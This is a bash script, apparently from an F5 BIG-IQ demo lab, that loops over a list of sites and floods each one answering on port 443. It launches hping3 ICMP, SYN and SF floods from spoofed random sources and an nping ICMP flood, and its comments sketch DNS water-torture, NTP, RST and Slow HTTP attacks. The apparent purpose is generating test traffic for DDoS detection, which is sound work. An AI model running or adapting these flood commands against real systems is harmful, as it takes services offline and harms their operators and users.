#!/bin/bash
# Uncomment set command below for code debuging bash
# set -x

home="/home/f5/scripts"

already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
if [  $already -gt 2 ]; then
    echo -e "The script is already running `expr $already - 2` time."
    exit 1
fi

# do not add site17, 19 and 21 (used for access app)
sitefqdn[1]="site10.example.com"
sitefqdn[2]="site11.example.com"
sitefqdn[3]="site12.example.com"
sitefqdn[4]="site13.example.com"
sitefqdn[5]="site14.example.com"
sitefqdn[6]="site15.example.com"
sitefqdn[7]="site16.example.com"
sitefqdn[8]="site18.example.com"
sitefqdn[9]="site20.example.com"
sitefqdn[10]="site22.example.com"
sitefqdn[11]="site23.example.com"
sitefqdn[12]="site25.example.com"
sitefqdn[13]="site26.example.com"
sitefqdn[14]="site27.example.com"
sitefqdn[15]="site28.example.com"
sitefqdn[16]="site29.example.com"
sitefqdn[17]="site30.example.com"
sitefqdn[18]="site32.example.com"
sitefqdn[19]="site36.example.com"
sitefqdn[20]="site38.example.com"
sitefqdn[21]="site40.example.com"
sitefqdn[22]="site42.example.com"

# add FQDN from Apps deployed with the SSG Azure and AWS scripts from /home/f5/scripts/ssg-apps
if [ -f /home/f5/scripts/ssg-apps ]; then
        i=${#sitefqdn[@]}
        SSGAPPS=$(cat /home/f5/scripts/ssg-apps)
        for fqdn in ${SSGAPPS[@]}; do
                i=$(($i+1))
                sitefqdn[$i]="$fqdn"
        done
fi


# get length of the array
arraylength=${#sitefqdn[@]}

# customise thresholds for BIG-IQ
#curl -X GET http://localhost:8100/cm/shared/policymgmt/alert-rules/dos-bad-traffic-growth-default-rule
#json='{"name":"dos-bad-traffic-growth-default-rule","alertTypeId":"dos-bad-traffic-growth","isDefault":true,"producerType":"application","alertType":"active","alertContext":"dos-l7-attacks","alertRuleType":"metric","errorThreshold":0,"unit":"count","operator":"greater-than","observation":2,"referenceObservation":4,"errorDelta":0,"enabled":true,"generation":1,"lastUpdateMicros":1544082602332631,"kind":"cm:shared:policymgmt:alert-rules:alertrulestate","selfLink":"https://localhost/mgmt/cm/shared/policymgmt/alert-rules/dos-bad-traffic-growth-default-rule"}'
#curl -X PATCH http://localhost:8100/cm/shared/policymgmt/alert-rules/dos-bad-traffic-growth-default-rule -d $json


for (( i=1; i<${arraylength}+1; i++ ));
do
    if [ ! -z "${sitefqdn[$i]}" ]; then
        # Only generat traffic on alive VIP
        ip=$(ping -c 1 -w 1 ${sitefqdn[$i]} | grep PING | awk '{ print $3 }')
        timeout 1 bash -c "cat < /dev/null > /dev/tcp/${ip:1:-1}/443"
        if [  $? == 0 ]; then
		# Port 443 open
		port=443
        else
                # If 443 not anwser, trying port 80
                timeout 1 bash -c "cat < /dev/null > /dev/tcp/${ip:1:-1}/80"
                if [  $? == 0 ]; then
                        # Port 80 open
                        port=80
                else
                      port=0
                fi
        fi

        # Only sending traffic to Apps on port 443
        if [[  $port == 443 ]]; then
            
            echo -e -e "\n# site $i ${sitefqdn[$i]} DDOS attack"

            # sudo docker run -t -i kalilinux/kali-linux-docker apt-get update && apt-get install metasploit-framework
            # sudo docker run -t -i kalilinux/kali-linux-docker hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source site42.example.com &

            # hping3 flood mod
            #sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source ${sitefqdn[$i]}  > /dev/null 2>&1 &
            #pid=$(ps -ef | grep hping3 | grep -v grep | awk '{ print $2 }')
            #echo -e $pid
            #r=`shuf -i 120-600 -n 1`;
            #perl -le "sleep rand $r" && sudo kill -9 $pid &
            #ps -ef | grep hping3 | grep -v grep
            #ps -ef | grep "sleep rand" | grep -v grep

            #echo -e "Running HPing3 attack script towards FTP... \r\n"
            #sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ${sitefqdn[$i]}  > /dev/null 2>&1 &

            echo -e "Running ping flood attack from random sources \r\n"
            sudo hping3 ${sitefqdn[$i]} --icmp --flood --rand-source > /dev/null 2>&1 &

            #--- HTTP attacks ---
            echo -e "Running HPing3 flood attack to HTTP \r\n "
            sudo hping3 ${sitefqdn[$i]} -p $port –SF --flood > /dev/null 2>&1 &

            echo -e "Running syn flood attack from random sources, towards a webserver \r\n "
            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 ${sitefqdn[$i]} > /dev/null 2>&1 &

            #echo -e "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 > /dev/null 2>&1 &

            #echo -e "Performing a TCP SYN Flood towards SSH \r\n"
            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 > /dev/null 2>&1 &

            RATE=5000
            SAMPLES=1000000000
            NPING_SILENT='-HNq'
            echo -e "Performing a ICMP Flood \r\n "
            sudo nping ${sitefqdn[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --icmp > /dev/null 2>&1 &

            #echo -e "Performing a RST Flood on TCP towards SSH \r\n "
            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 > /dev/null 2>&1 &

            #------ Attack traffic ----------
            #echo -e "Running NX Domain attack python script... \r\n "
            #sudo python attack_dns_nxdomain.py $server_ip example.com 10000 > /dev/null 2>&1 &
            #echo -e "Running DNS Water Torture attack against server"
            #sudo ./attack_dns_watertorture_wget.sh $server_ip > /dev/null 2>&1 &

            #--- web attacks -----
            #echo -e "Performing a Slow HTTP Test script against webserver \r\n "
            #sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 > /dev/null 2>&1 &
            #sudo ./gen_ab.sh $server_ip > /dev/null 2>&1 &
            
            r=`shuf -i 120-600 -n 1`;
            perl -le "sleep rand $r" && killall -9 hping3 &
            perl -le "sleep rand $r" && killall -9 nping &

        else
                echo -e "SKIP ${sitefqdn[$i]} - $ip not answering on port 443 or 80"
        fi
   fi
done